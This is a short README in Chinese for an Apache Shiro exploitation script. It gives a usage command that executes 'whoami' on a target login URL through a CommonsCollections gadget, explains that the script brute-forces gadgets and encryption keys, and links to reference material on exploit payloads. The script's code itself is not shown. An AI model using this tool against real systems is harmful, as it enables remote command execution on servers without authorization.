## Apache Shiro

#### 使用方法

```bash
python3 Apache_Shiro_Scan.py -u http://target.com/user/login.do -c 'whoami' -g CommonsCollections10
```

`-u` 指定目标 url
`-c` 指定命令
`-g` 指定 `Gadget`，如不指定，遍历脚本中的 11 个 `Gadget`
`-k` 指定 `key`，如不指定，遍历脚本中的 24 个 `key`

#### 参考

[ShiroScan](https://github.com/sv3nbeast/ShiroScan)

[java.lang.Runtime.exec() Payload Workarounds](http://www.jackson-t.ca/runtime-exec-payloads.html)
